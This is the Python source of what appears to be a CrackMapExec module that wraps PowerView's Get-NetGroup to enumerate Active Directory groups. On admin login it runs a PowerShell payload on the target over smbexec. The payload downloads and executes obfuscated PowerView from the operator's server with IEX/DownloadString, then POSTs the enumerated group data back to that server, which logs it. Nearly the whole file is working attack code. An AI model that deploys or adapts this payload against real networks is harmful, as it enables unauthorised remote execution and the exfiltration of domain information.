from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log
from StringIO import StringIO
from datetime import datetime

class CMEModule:
    '''
        Wrapper for PowerView's Get-NetGroup function
        Module by @byt3bl33d3r
    '''

    name = 'getgroups'

    description = "Wrapper for PowerView's Get-NetGroup function"

    def options(self, context, module_options):
        '''
            GROUP  The group name to query for, wildcards accepted (default: all groups)
            DOMAIN The domain to query for groups (default: current domain) 
        '''

        self.group = None
        self.domain = None
        if 'GROUP' in module_options:
            self.group = module_options['GROUP']

        if 'DOMAIN' in module_options:
            self.domain = module_options['DOMAIN']


    def on_admin_login(self, context, connection):

        powah_command = 'Get-NetGroup'

        if self.group:
            powah_command += ' -GroupName "{}"'.format(self.group)

        if self.domain:
            powah_command += ' -Domain {}'.format(self.domain)

        powah_command += ' | Out-String'

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/PowerView.ps1');
        $data = {command}
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server, 
                                          port=context.server_port, 
                                          addr=context.localip,
                                          command=powah_command)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload, method='smbexec')
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'PowerView.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('Recon/PowerView.ps1'), 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read())
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)

            log_name = 'Groups-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))